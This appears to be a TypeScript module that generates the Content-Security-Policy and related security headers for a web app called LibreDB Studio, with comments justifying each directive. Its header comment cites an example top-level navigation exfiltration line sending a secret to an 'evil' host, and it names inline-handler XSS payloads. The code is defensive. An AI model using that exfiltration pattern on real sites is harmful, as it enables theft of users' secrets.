/**
 * The security header set LibreDB Studio requires, as pure data.
 *
 * THIS MODULE MUST HAVE NO IMPORTS. It is published as `@libredb/studio/security` so that
 * libredb-platform can adopt the same policy from its own Next config, where neither the "@/"
 * alias nor a Studio runtime exists. Anything that reads process.env belongs in
 * src/lib/security/config.ts, not here.
 *
 * What this CSP buys, stated honestly so nobody later reads 'unsafe-inline' as an oversight:
 * every document route in this app is statically prerendered with nonce-less inline
 * `self.__next_f.push` scripts, and a per-request nonce cannot be applied to prerendered HTML.
 * So script-src carries 'unsafe-inline', and the policy does NOT block the <img onerror> /
 * <svg onload> payload class. Phase 0 closed that class by construction (React element
 * rendering, no HTML strings). What this policy adds is exfiltration and loader containment:
 * connect-src blocks fetch to an attacker host, img-src blocks beacon-by-image to a foreign
 * origin, form-action blocks form-based exfiltration, base-uri blocks relative-URL hijacking,
 * object-src and frame-src remove the plugin and frame vectors, and script-src 'self' still
 * blocks loading a remote script and every eval. Top-level navigation exfiltration
 * (location = "https://evil/?" + secret) remains possible; CSP has had no directive for it since
 * navigate-to was withdrawn.
 */

export type CspDirectives = Record<string, string[]>;

export interface CspOptions {
  /**
   * Absolute URL or path where Monaco's AMD bundle is served. An absolute URL adds its origin to
   * script-src and worker-src. Defaults to the same-origin /monaco/vs, which needs no source.
   */
  monacoVsPath?: string;
  /** Extra sources merged per directive, for hosts only the embedder knows about. */
  extra?: Partial<CspDirectives>;
}

export interface SecurityHeaderOptions extends CspOptions {
  /** Emit Content-Security-Policy-Report-Only instead of Content-Security-Policy. */
  reportOnly?: boolean;
  /** false disables HSTS; an object customises it. */
  hsts?: false | { maxAgeSeconds: number; includeSubDomains?: boolean };
}

/**
 * 180 days, not two years, and without preload: a self-hoster who reverts to plain HTTP must not
 * be locked out of their own deployment for two years. RFC 6797 requires user agents to ignore
 * the header when it arrives over plain HTTP, so the plain-HTTP channels (umbrelOS, Unraid, the
 * Azure template, the desktop loopback shell) are unaffected and no decision has to be made about
 * trusting x-forwarded-proto.
 */
export const HSTS_MAX_AGE_SECONDS = 15_552_000;

/**
 * Permissions-Policy lists ONLY denials. An unlisted feature keeps its default allowlist ('self'),
 * which is why clipboard-read and clipboard-write must not appear here: the results grid copies to
 * the clipboard, and listing them with a narrower value is how that breaks.
 */
const DENIED_FEATURES = [
  "accelerometer",
  "autoplay",
  "camera",
  "display-capture",
  "encrypted-media",
  "geolocation",
  "gyroscope",
  "magnetometer",
  "microphone",
  "midi",
  "payment",
  "publickey-credentials-get",
  "screen-wake-lock",
  "serial",
  "usb",
  "xr-spatial-tracking",
];

const PERMISSIONS_POLICY = DENIED_FEATURES.map((feature) => `${feature}=()`).join(", ");

/** The origin of an absolute http(s) URL, or undefined for a relative path. */
function absoluteOrigin(value: string | undefined): string | undefined {
  if (!value) return undefined;
  if (!/^https?:\/\//i.test(value)) return undefined;
  const pathStart = value.indexOf("/", value.indexOf("://") + 3);
  if (pathStart === -1) return value;
  return value.slice(0, pathStart);
}

function mergeSources(base: CspDirectives, extra: Partial<CspDirectives> | undefined): CspDirectives {
  if (!extra) return base;
  const merged: CspDirectives = { ...base };
  for (const [directive, sources] of Object.entries(extra)) {
    if (!sources) continue;
    const current = merged[directive] ?? [];
    merged[directive] = [...current, ...sources.filter((source) => !current.includes(source))];
  }
  return merged;
}

function serializeCsp(directives: CspDirectives): string {
  return Object.entries(directives)
    .map(([directive, sources]) => (sources.length > 0 ? `${directive} ${sources.join(" ")}` : directive))
    .join("; ");
}

/** The directives Monaco and Studio actually require, as a structured, mergeable map. */
export function studioCspDirectives(options: CspOptions = {}): CspDirectives {
  const monacoOrigin = absoluteOrigin(options.monacoVsPath);

  // 'unsafe-inline': see the module comment. 'unsafe-eval' is deliberately absent — Monaco's AMD
  // loader picks the tag-injection loader on the document thread (public/monaco/vs/loader.js:365),
  // and no worker bundle, elkjs, or sql-formatter path calls eval or new Function.
  const scriptSrc = ["'self'", "'unsafe-inline'"];
  // Monaco injects <style> elements at runtime for the db-dark theme, and the app uses the React
  // style={{...}} prop with computed values at 41 sites. Neither is nonce-able or hash-able.
  const styleSrc = ["'self'", "'unsafe-inline'"];
  // Monaco's five workers and the ELK layout worker are same-origin module workers. No blob: worker
  // exists anywhere, so this stays strict: a worker failure is loud and the e2e suite catches it.
  const workerSrc = ["'self'"];

  if (monacoOrigin) {
    scriptSrc.push(monacoOrigin);
    workerSrc.push(monacoOrigin);
  }

  return mergeSources(
    {
      "default-src": ["'self'"],
      "base-uri": ["'none'"],
      "object-src": ["'none'"],
      "frame-src": ["'none'"],
      "frame-ancestors": ["'none'"],
      "form-action": ["'self'"],
      "script-src": scriptSrc,
      "style-src": styleSrc,
      // data: is load-bearing: @zumer/snapdom rasterizes by assigning a data:image/svg+xml URL to
      // an <img>, which the ER-diagram and chart PNG exports both go through. blob: is a
      // same-origin-only scheme with no exfiltration value and removes a silent-failure class.
      "img-src": ["'self'", "data:", "blob:"],
      // Monaco's editor.main.css embeds the codicon icon font as a base64 data: URI. Without this
      // the editor keeps working while every gutter and menu glyph silently disappears.
      "font-src": ["'self'", "data:"],
      "connect-src": ["'self'"],
      "worker-src": workerSrc,
    },
    options.extra,
  );
}

/** Ready-to-spread header name to value map, CSP already serialized. */
export function securityHeaders(options: SecurityHeaderOptions = {}): Record<string, string> {
  const policy = serializeCsp(studioCspDirectives(options));
  const cspHeader = options.reportOnly ? "Content-Security-Policy-Report-Only" : "Content-Security-Policy";

  const headers: Record<string, string> = {
    "X-Content-Type-Options": "nosniff",
    // same-origin, NOT strict-origin-when-cross-origin: it leaks nothing cross-origin AND it
    // preserves the same-origin Referer that the Origin check uses as its fallback signal.
    "Referrer-Policy": "same-origin",
    "Permissions-Policy": PERMISSIONS_POLICY,
    // Duplicates frame-ancestors 'none' deliberately, for engines that predate CSP Level 2.
    // Verified safe: zero <iframe> in src, and the desktop shell navigates rather than frames.
    "X-Frame-Options": "DENY",
    [cspHeader]: policy,
  };

  const hsts = options.hsts ?? { maxAgeSeconds: HSTS_MAX_AGE_SECONDS };
  if (hsts !== false) {
    headers["Strict-Transport-Security"] = hsts.includeSubDomains
      ? `max-age=${hsts.maxAgeSeconds}; includeSubDomains`
      : `max-age=${hsts.maxAgeSeconds}`;
  }

  return headers;
}
